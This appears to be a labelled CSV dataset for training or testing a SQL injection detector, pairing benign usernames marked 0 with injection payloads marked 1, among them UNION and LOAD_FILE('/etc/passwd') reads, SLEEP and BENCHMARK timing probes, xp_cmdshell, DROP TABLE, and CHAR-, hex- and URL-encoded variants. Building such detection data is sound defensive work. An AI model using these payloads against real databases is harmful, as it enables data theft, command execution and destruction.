name,is_malicious
april91CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(40)CHAR(83)CHAR(76)CHAR(69)CHAR(69)CHAR(80)CHAR(40)CHAR(53)CHAR(41)CHAR(41)CHAR(41)CHAR(98)CHAR(65)CHAR(75)CHAR(76)CHAR(41)CHAR(45)CHAR(45),1
vgordon,0
amandabailey,0
lauren78,0
whayes,0
hhunt,0
kcisneros,0
jmaxwell,0
'; EXEC xp_cmdshell('dir')--,1
pinedabarbara,0
jeffreyescobar0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
stephanieaguirre,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
williamsanthony' OR SOUNDEX('test')=SOUNDEX('test')--,1
brian34,0
ebuckley,0
francisco72,0
hillstephen,0
lindsey68,0
fishermary,0
jacksonjessica,0
joshuagraham,0
jeanne72,0
ryan11,0
charlesjohn,0
lgalvan,0
lisagardner,0
cwilliams,0
gfowler,0
udixon,0
ccarrillo,0
tom48,0
markmoore' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
ericbenjamin,0
victoriawright,0
ryan32,0
rogersmichael,0
fuentesdaniel,0
davisnatasha,0
' OR 0x50=0x50--,1
jackiemartinez,0
lewisgail,0
annette99,0
emilywilliamson,0
mpotts,0
nfleming,0
'; EXEC xp_cmdshell('dir')--,1
matthewkelly,0
georgecourtney,0
clarkcody,0
frank44,0
randallwallace,0
jamiecook,0
patrick18,0
helen11,0
ysmith,0
drew18,0
sandra030x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
james16' UNION SELECT * FROM users--,1
lucascindy' OR '1'='1,1
nicolerodriguez,0
wallacetyrone,0
hkhan,0
"rodriguezthomas'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lisa93,0
heather46,0
lynnpayne,0
rhonda02,0
luiswhite,0
pdillon' OR 1=1--,1
henrybrittany,0
amy05,0
ijohnson,0
parkerchristy,0
patriciagray,0
melissa27,0
angela12,0
fgilbert,0
wongashlee,0
' UNION SELECT * FROM users--,1
anguyen,0
uhouston,0
stephensmichaelCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
patriciaparker,0
uhardin,0
casey76,0
murphycolleen,0
lgonzales,0
lisa57,0
morgankelly,0
msherman,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
hollythomas,0
charles05,0
willislindsay'; DROP TABLE users--,1
patriciasherman,0
barbarabowen,0
rodriguezthomas,0
hpeters,0
johnsonandrew,0
marcmason,0
monica65,0
boydnicholas,0
emilycampbell,0
tmoralesCHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(65)CHAR(76)CHAR(76)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(76)CHAR(79)CHAR(65)CHAR(68)CHAR(95)CHAR(70)CHAR(73)CHAR(76)CHAR(69)CHAR(40)CHAR(39)CHAR(47)CHAR(101)CHAR(116)CHAR(99)CHAR(47)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(100)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
pruittcalvin,0
jasonkennedy,0
' OR '1'='1,1
freemanmichael,0
' UNION SELECT * FROM users--,1
mwheeler,0
ygreene,0
antonioramirez,0
cooperjasmine,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lanesusan,0
smithjames'%27%20OR%201=1--,1
edwardaustin,0
elizabethwatkins,0
jennifer12,0
prestonjennifer,0
mercerjohn,0
' UNION SELECT * FROM users--,1
tim96,0
logan09,0
'||'1'='1,1
conradnicholas,0
leemitchell'%27%20OR%201=1--,1
thomas99,0
0x270x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
brennanjohn,0
salinassteven,0
nhunter,0
jamie59,0
dave66,0
gfranklin,0
kimberly69,0
ryandanny,0
tasha88,0
donna83,0
vgomez,0
mccormickmatthew,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
reidrebecca'/**/OR/**/'1'='1,1
ysmith,0
andrewjohnston,0
vancemargaret,0
elizabeth82,0
stephenrubio,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
traviscantu,0
john12,0
john72,0
josephharris'%20OR%201=1--,1
gtate,0
masseyadam,0
miranda43,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
asmith,0
fowlerkatherine,0
'; DROP TABLE users--,1
stuartmartin,0
louissmith,0
christopherjohnson,0
belljennifer,0
amanda38,0
joy45,0
trandanny,0
zallen,0
michael72,0
stephenbailey,0
jacob06,0
smithrobert,0
samanthahowell,0
andersonevan,0
lindadennis,0
mary19,0
lthompson,0
edward78,0
holtcraig,0
timothydaniels,0
rogerandersen,0
randygriffin,0
cperez,0
ericaharrison' OR '1'='1,1
williamlowe,0
rickyjackson,0
ohansen,0
mhicks,0
' OR 0x50=0x50--,1
hford,0
mary67,0
hallrebecca,0
ryan39,0
marklyons,0
ingramlauren,0
paynekevin,0
lewisjackie,0
%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
shelby56,0
zimmermankenneth,0
nsmith,0
whitney43' OR '1'='1,1
bradfordwendy,0
kristen80,0
nanderson,0
joanncohen,0
leonardapril,0
lauramartin,0
zbean,0
wsanchez,0
brookeorozco,0
ybonilla,0
suzannefarley,0
eblackburn' OR CHAR(49)=CHAR(49)--,1
xlong,0
alison03,0
charlesjohnson,0
maybrooke,0
sheilamullen,0
0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
smason' OR 1=1--,1
kathryn02,0
smithjennifer,0
sheltonjames' UNION SELECT * FROM users--,1
wrobertson,0
ellenbond,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
larryrobbins,0
jenningsrebecca'%27%20OR%201=1--,1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
wperez,0
pricemichele,0
ashleylawson,0
benjamin01,0
timothy48,0
michael36,0
'%27%20OR%201=1--,1
fgordon,0
holmesdavid,0
fperry,0
daltonlarry,0
christina84,0
alexandergreen,0
mooredaniel,0
brittany51,0
pmarshall,0
jeremiah96,0
' UNION SELECT * FROM users--,1
greenmatthew,0
coreystephens,0
kendramcdowell,0
brendagarcia,0
philliparroyo,0
corey34'%20OR%201=1--,1
lauren21' OR 1=1--,1
'%27%20OR%201=1--,1
emcfarland,0
christopheranderson,0
eric52,0
ccase,0
moorecarlos,0
aespinoza,0
nnguyen,0
robin92,0
joshuadavidson,0
kennethrosales,0
jonesadrian,0
brendahayden,0
jeffrey58,0
williamsmith,0
curtisbryan,0
evansalexander,0
imiller,0
james38,0
mdavis,0
lori39,0
marilynperez,0
zacharydavis,0
rlarson,0
jesse74,0
gregorykeith,0
lance96,0
william32,0
"davidhunt' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
wardkatherine,0
pgray,0
anthony39,0
debrarodriguez,0
nicole92,0
zacharykelly,0
tiffany61' OR BINARY 'a'='a'--,1
'/**/OR/**/'1'='1,1
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
crossgary,0
robert21,0
lindsay10' OR BINARY 'a'='a'--,1
llee,0
christopherhoward,0
jonathan78,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
"smithgary' OR BENCHMARK(10000000,MD5(NOW()))--",1
marshallbrandon,0
marktate,0
adamrogers,0
danielalicia%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
paul49,0
jillian03,0
stacy83,0
beth47,0
ifrey,0
kristina20,0
levihooper,0
'/**/OR/**/'1'='1,1
gnorman,0
sandramalone,0
johnvalencia%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
shelbyhenry,0
gordonbrian' OR 0x50=0x50--,1
kelly31,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
mcmillanmelissa,0
' OR '1'='1,1
CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
tcross,0
"anitajones'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
mpadilla,0
jacksondonna,0
lauragallagher,0
devin54,0
michaelewing,0
glenda89,0
holly77,0
nhicks,0
johnsonkimberly,0
chapmanclayton,0
hrhodes,0
cassandramartin,0
emartinez,0
alexis77' OR SOUNDEX('test')=SOUNDEX('test')--,1
hesterstephen,0
mvalenzuela,0
robinthomas,0
john46,0
joshua42,0
stacy31,0
hcase,0
CHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
hineskevin,0
heatheracosta,0
bcarter,0
melodycoffey,0
jacobmorris,0
christopherfields,0
justin17,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
amanda89,0
'; EXEC xp_cmdshell('dir')--,1
beltranjohn,0
twheeler,0
morrisadam,0
tiffanysmith,0
pthomas,0
freemancourtney,0
uglover,0
martinlaura,0
riverastephanie,0
kennedycorey,0
stephaniealexander,0
megancarterCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(69)CHAR(78)CHAR(67)CHAR(72)CHAR(77)CHAR(65)CHAR(82)CHAR(75)CHAR(40)CHAR(49)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(48)CHAR(44)CHAR(77)CHAR(68)CHAR(53)CHAR(40)CHAR(78)CHAR(79)CHAR(87)CHAR(40)CHAR(41)CHAR(41)CHAR(41)CHAR(45)CHAR(45),1
pmurphy,0
zgreen,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
hwyatt,0
samuel07,0
erik95,0
hpatton,0
hoodjamie,0
robertwiggins,0
edwardsmith,0
rachelwilliams,0
CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
cisnerosamanda,0
'; EXEC xp_cmdshell('dir')--,1
racheltravis,0
'%27%20OR%201=1--,1
robertnguyen,0
xharris0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
jacobscolleen,0
steven75'; DROP TABLE users--,1
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
samanthaanderson,0
thomasgallegos,0
mneal,0
nsalas,0
milleramanda,0
kenneth56,0
kurt18' OR 1=1--,1
kjordan,0
valdezjennifer' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
samanthayu,0
loretta93,0
daniel09,0
brownharold,0
amanda57,0
stephenswilliam,0
gpayne,0
johnsonthomas,0
erica18,0
nathan82,0
angelamiller,0
roblesgail,0
creynolds,0
eric18,0
sweeneypeter,0
rodriguezmelissa,0
gmoore,0
justinhardin,0
vli'||'1'='1,1
monica07,0
michelle68,0
pbenton,0
johnsonstephanie,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
parkerrhonda,0
donnasmith,0
hbrowning,0
markvincent,0
deanchristina,0
jonessteven,0
%27 %4f%52 %43%48%41%52%28%34%39%29%3d%43%48%41%52%28%34%39%29--,1
fitzgeraldrobin,0
jessicawilliams,0
brett43,0
unelson,0
bradleyyu,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
adamsimmons,0
smithjoseph,0
mitchellelizabeth,0
jaimeanderson,0
farleytammy,0
nicolaspeterson,0
tromero' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
richardsonpatrick,0
lori18,0
smithdorothy,0
piercebrian,0
sharonjohnson,0
watsongary,0
smithmichael,0
jillholmes,0
amandamedina,0
laradennis' OR '1'='1,1
summerskenneth,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
amy36,0
marcuscordova,0
danielwilliams,0
'%27%20OR%201=1--,1
burgesssteven,0
tinafischer,0
sfritz,0
fosterrodney,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
william67,0
garciaroy,0
jamesthomas' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lanekenneth,0
whitecarol,0
daniel22,0
bcallahan,0
jamesbowers,0
zmendez,0
gallegosjohn,0
reginalynn,0
paul83,0
omcknight%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
huffmanshawn,0
copelanddeborah,0
cglass'||'1'='1,1
jamie16,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
linda53,0
eric00,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
' OR BINARY 'a'='a'--,1
kimberly27,0
herreraerin,0
carrollrobert,0
cdavis'; EXEC xp_cmdshell('dir')--,1
stevenwolf,0
anthonyharrison,0
kimberly69,0
ashley04,0
vbutler,0
anthonyreeves,0
CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
thomas34,0
deborah14,0
rwalters,0
ogrant,0
garrettrachel,0
antonio66,0
hunterdouglas,0
rsmith,0
schultzdorothy,0
bayers,0
jdaniel,0
jeremy13,0
adamsbethany'%20OR%201=1--,1
jennifersmith,0
cantusharon,0
%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
cynthia65,0
joseph35,0
shawthomas,0
ifernandez,0
michael15,0
gallen,0
'%20OR%201=1--,1
richardphelps,0
edodson,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
vwilliams,0
schaefereric,0
brandoncole,0
laura99,0
qchung,0
caitlyn68,0
collinspaul%27 %4f%52 %53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29%3d%53%4f%55%4e%44%45%58%28%27%74%65%73%74%27%29--,1
gloverchristopher,0
shelbymurphy,0
brian42,0
brentwinters,0
jrivera,0
alanthompson,0
deborahgutierrez,0
joshuawilliams,0
johnstonwilliamCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
odonnellrichard,0
morseangela,0
phyllis37,0
sotohenry,0
leah09,0
lanerobert,0
steinsierra,0
spencesamantha,0
calvingarcia,0
jbrown,0
huangjoe,0
ealexander,0
petersonedward,0
debbierodgers,0
fcarpenter,0
laurensmith' OR BINARY 'a'='a'--,1
rmunoz,0
jennifer93,0
wmiranda,0
' UNION SELECT * FROM users--,1
marywong,0
deleonjason,0
sanchezdarryl,0
' UNION SELECT * FROM users--,1
limichaelCHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
tmiller,0
veronica23,0
tgrant'; EXEC xp_cmdshell('dir')--,1
kho,0
kylesmith,0
%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
trichardson'; EXEC xp_cmdshell('dir')--,1
jermaine25,0
logan03' OR CHAR(49)=CHAR(49)--,1
aaron44,0
zpatel,0
antoniosmith,0
jshaw' OR SOUNDEX('test')=SOUNDEX('test')--,1
ashaw,0
davidgarrison,0
jonathon52'||'1'='1,1
parkerjoann,0
tgraves,0
kray,0
wwilson,0
kvega,0
mcintyreann,0
silvarachel,0
cannonrichard,0
perrysteven,0
buckleyshannon,0
wpierce,0
clifford31,0
christophersmith,0
reginaadams' OR CHAR(49)=CHAR(49)--,1
ipatrick,0
clayrandy%27 %4f%52 %42%49%4e%41%52%59 %27%61%27%3d%27%61%27--,1
jmarshall,0
ebarnes,0
'; EXEC xp_cmdshell('dir')--,1
christinaramirez,0
marie50'%20OR%201=1--,1
shannon42,0
tmorales,0
ashleypatterson,0
xwilliams,0
dana09,0
margaretgonzales,0
xbeard,0
tpugh,0
qhess,0
ybrewer,0
rojaschelsea,0
cbryan,0
pboone,0
alexandra21,0
ramseymichele,0
jenniferbridges,0
thomas94,0
dariusdaniel,0
jharrison,0
mshah,0
jackbutler,0
cheyenne18,0
%27 %55%4e%49%4f%4e %41%4c%4c %53%45%4c%45%43%54 %4c%4f%41%44%5f%46%49%4c%45%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29--,1
dpaul,0
achung,0
jparks,0
mcarroll,0
robert80,0
ericliu,0
aflynn,0
alexandra48,0
elizabethcastro,0
grace05,0
lauragibson,0
'; EXEC xp_cmdshell('dir')--,1
markblack,0
michelejohnson,0
brian76,0
smithstephanie,0
craiggerald,0
stanleymary,0
klinekathryn,0
lindsey74,0
steven46,0
stevenanderson,0
vazquezmichael,0
meghanwalker,0
brandi20,0
ryanmullins,0
deborah30,0
anthonydecker,0
scottpatricia,0
nicholas95,0
kmiller,0
jpeterson,0
thomasdave,0
xlopez,0
gloverandres,0
'%20OR%201=1--,1
nicholas46,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
kjones,0
kariroberson,0
gordonrichard,0
powelljoan,0
thomasphillips,0
castrosamantha,0
cassidy60,0
wendymoreno,0
nwheeler' OR CHAR(49)=CHAR(49)--,1
thomasjulie,0
smithkaren,0
makayla51,0
james85,0
robert46,0
eric04,0
mmorgan,0
regina35,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
brownemily,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
fowlerkari,0
tiffany74,0
gracenguyen,0
whitetracy,0
jmullins,0
andrew84,0
townsendsara' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lynn07,0
rhondanunez,0
amyholmes,0
jestes,0
'%27%20OR%201=1--,1
dakotagibson,0
wangcraig,0
brownemily,0
ryanlang,0
ronnie85,0
thomaslove,0
saundersjonathan,0
mhumphrey,0
leslie57,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
janeespinoza,0
nicole85,0
rryan,0
mitchell55,0
perrystephen,0
scotthumphrey,0
trevinoalex,0
sandovaladam,0
matthewcastillo,0
staceycampbell,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
abrooks,0
sullivancrystal,0
jjohnson,0
tmccall,0
hernandezmichael,0
xkoch,0
lisa19,0
rhodesbrett,0
brittanyheath,0
lesliechang,0
markjohnson,0
frankwillis,0
' OR CHAR(49)=CHAR(49)--,1
wendyacosta,0
williamscaitlin,0
andres26,0
peter84'%20OR%201=1--,1
dennis58'||'1'='1,1
kristin05,0
igregory,0
olsencrystal%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
turnernathan'||'1'='1,1
alexander89,0
johnvillanueva,0
chambersjennifer,0
xhardy,0
ibarraedward,0
butlerjoanna,0
bthompson,0
CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(49)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(79)CHAR(85)CHAR(78)CHAR(84)CHAR(40)CHAR(42)CHAR(41)CHAR(44)CHAR(67)CHAR(79)CHAR(78)CHAR(67)CHAR(65)CHAR(84)CHAR(40)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(67)CHAR(85)CHAR(82)CHAR(82)CHAR(69)CHAR(78)CHAR(84)CHAR(95)CHAR(85)CHAR(83)CHAR(69)CHAR(82)CHAR(40)CHAR(41)CHAR(41)CHAR(44)CHAR(48)CHAR(120)CHAR(51)CHAR(97)CHAR(44)CHAR(70)CHAR(76)CHAR(79)CHAR(79)CHAR(82)CHAR(40)CHAR(82)CHAR(65)CHAR(78)CHAR(68)CHAR(40)CHAR(48)CHAR(41)CHAR(42)CHAR(50)CHAR(41)CHAR(41)CHAR(120)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(73)CHAR(78)CHAR(70)CHAR(79)CHAR(82)CHAR(77)CHAR(65)CHAR(84)CHAR(73)CHAR(79)CHAR(78)CHAR(95)CHAR(83)CHAR(67)CHAR(72)CHAR(69)CHAR(77)CHAR(65)CHAR(46)CHAR(80)CHAR(76)CHAR(85)CHAR(71)CHAR(73)CHAR(78)CHAR(83)CHAR(32)CHAR(71)CHAR(82)CHAR(79)CHAR(85)CHAR(80)CHAR(32)CHAR(66)CHAR(89)CHAR(32)CHAR(120)CHAR(41)CHAR(97)CHAR(41)CHAR(45)CHAR(45),1
seanjackson' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
farmertina,0
stephaniehill,0
"katherine56' OR BENCHMARK(10000000,MD5(NOW()))--",1
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(61)CHAR(83)CHAR(79)CHAR(85)CHAR(78)CHAR(68)CHAR(69)CHAR(88)CHAR(40)CHAR(39)CHAR(116)CHAR(101)CHAR(115)CHAR(116)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
miranda98,0
carteryolanda,0
michael05,0
jermainelewis,0
xwhite,0
annemurphy' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
lopezchristopher'/**/OR/**/'1'='1,1
nathanreilly' OR 0x50=0x50--,1
carlsonholly,0
mathisbenjamin,0
hansonmichelle,0
gomezdenise,0
nelsonjoyce,0
cookjason,0
bradharper,0
stephanie96,0
tannerwright,0
tgonzales,0
lopezkim,0
patrick97' OR 0x50=0x50--,1
brian58,0
smadden,0
alexisbrown,0
davidkennedy,0
' OR BINARY 'a'='a'--,1
susan03,0
richmorgan'; DROP TABLE users--,1
gfrost,0
danielmcclain,0
michaelcruz,0
qrobertson,0
bhicks,0
ryan58,0
bwillis,0
nicholasfitzpatrick,0
jesse11,0
hahncourtney,0
"kristen13'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
mandybradford,0
grayashley,0
davisbenjamin,0
kellerkyle,0
scottsmith,0
feliciaramirez,0
"dylan11' OR BENCHMARK(10000000,MD5(NOW()))--",1
michaeldanielle,0
bscott,0
'/**/OR/**/'1'='1,1
wbarrera,0
cberry' OR 0x50=0x50--,1
alvarezxavier,0
briannacarpenter,0
jacob10' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
kathleenmiddleton,0
matthew03' OR BINARY 'a'='a'--,1
hrodriguez0x270x7c0x7c0x270x310x270x3d0x270x31,1
bakerjoshua,0
kimberly04,0
carolyn19,0
rebeccamartinez,0
hooverashley,0
fcortez'%20OR%201=1--,1
tyler28,0
jonathan03,0
tuckertimothy,0
lindsey76,0
